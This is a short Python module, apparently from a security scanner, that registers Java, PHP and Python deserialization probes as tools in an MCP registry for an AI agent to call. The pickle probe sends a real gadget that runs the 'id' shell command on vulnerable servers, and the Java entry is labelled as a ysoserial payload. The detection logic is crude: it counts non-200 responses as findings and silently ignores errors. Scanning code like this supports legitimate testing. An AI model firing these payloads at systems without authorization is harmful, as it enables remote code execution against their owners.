"""Deserialization scanner — Java, PHP, Python."""
import asyncio, httpx, base64
from .mcp_registry import registry

JAVA_DESER_PAYLOADS = {
    "ysoserial_common1": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
}

async def scan_java_deser(target: str) -> dict:
    findings = []
    for name, payload in JAVA_DESER_PAYLOADS.items():
        try:
            url = f"{target.rstrip('/')}/"
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.post(url, content=base64.b64decode(payload),
                                 headers={"Content-Type": "application/x-java-serialized-object"})
                if r.status_code != 200:
                    findings.append({"payload": name, "status": r.status_code})
        except: pass
    return {"target": target, "type": "Java Deserialization", "tested": len(JAVA_DESER_PAYLOADS),
            "vulnerable": len(findings) > 0, "findings": findings}

async def scan_php_deser(target: str, param: str = "data") -> dict:
    payloads = ["O:8:stdClass:0:{}", "a:2:{i:0;s:4:test;i:1;i:1337;}"]
    found = []
    for p in payloads:
        try:
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.get(f"{target.rstrip('/')}/?{param}={p}")
                if r.status_code == 500:
                    found.append({"payload": p, "status": 500, "vulnerable": True})
        except: pass
    return {"target": target, "type": "PHP Deserialization", "tested": len(payloads),
            "vulnerable": len(found) > 0, "findings": found}

async def scan_pickle(target: str, param: str = "data") -> dict:
    try:
        pickled = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(f"{target.rstrip('/')}/?{param}={pickled}")
            return {"target": target, "type": "Python Pickle", "status": r.status_code, "tested": True}
    except Exception as e:
        return {"error": str(e)}

registry.register("scan_java_deser", "Java deserialization test", {"target": "str"}, scan_java_deser)
registry.register("scan_php_deser", "PHP deserialization test", {"target": "str", "param": "str"}, scan_php_deser)
registry.register("scan_pickle", "Python pickle deserialization test", {"target": "str", "param": "str"}, scan_pickle)
